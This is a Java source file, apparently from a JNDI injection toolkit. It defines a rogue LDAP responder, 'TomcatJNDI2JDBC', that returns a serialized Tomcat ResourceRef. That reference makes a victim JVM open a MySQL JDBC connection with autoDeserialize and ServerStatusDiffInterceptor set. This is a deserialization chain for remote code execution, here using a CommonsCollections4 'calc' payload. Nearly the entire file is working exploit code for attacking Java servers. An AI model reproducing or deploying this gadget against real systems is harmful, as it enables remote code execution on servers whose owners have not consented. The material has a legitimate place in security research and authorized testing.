package net.roboterh.injector.gadgets;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import net.roboterh.injector.utils.GadgetUtils;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;


/*
    TomcatJNDI2JDBC Way:
    Requirement:
        Tomcat and particular driver in classpath
    Explanation:
        1. ResourceFactory#getObjectFactory: if the key factory is not exist, the getDefaultFactory method will be called
        2. if the target class in Reference is `javax.sql.DataSource`, it will reconstruct a new factory default is `org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory`
 */
public class TomcatJNDI2JDBC implements LDAPService{

    private static final Logger logger = LogManager.getLogger(TomcatJNDI2JDBC.class);



    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String baseDN) {
        // parse args
        argsHandler(baseDN);
        // generateHandler
        generateHandler();

        System.out.println(this.getClass().getName() + "sendResult start.....");

        ResourceRef resourceRef = new ResourceRef("javax.sql.DataSource", null, "", "", true,
                "org.apache.naming.factory.ResourceFactory", null);
        resourceRef.add(new StringRefAddr("driverClassName", "com.mysql.jdbc.Driver"));
        String JDBC_url = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections4_calc";
        resourceRef.add(new StringRefAddr("url", JDBC_url));
        resourceRef.add(new StringRefAddr("username", "yso_CommonsCollections4_calc"));
        resourceRef.add(new StringRefAddr("initialSize", "1"));

        Entry entry = new Entry(baseDN);
        entry.addAttribute("javaClassName", "java.lang.Class");
        entry.addAttribute("javaSerializedData", GadgetUtils.serialize(resourceRef));
        try {
            result.sendSearchEntry(entry);
        } catch (LDAPException e) {
            throw new RuntimeException(e);
        }
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void argsHandler(String baseDN) {

    }

    @Override
    public void generateHandler() {

    }
}
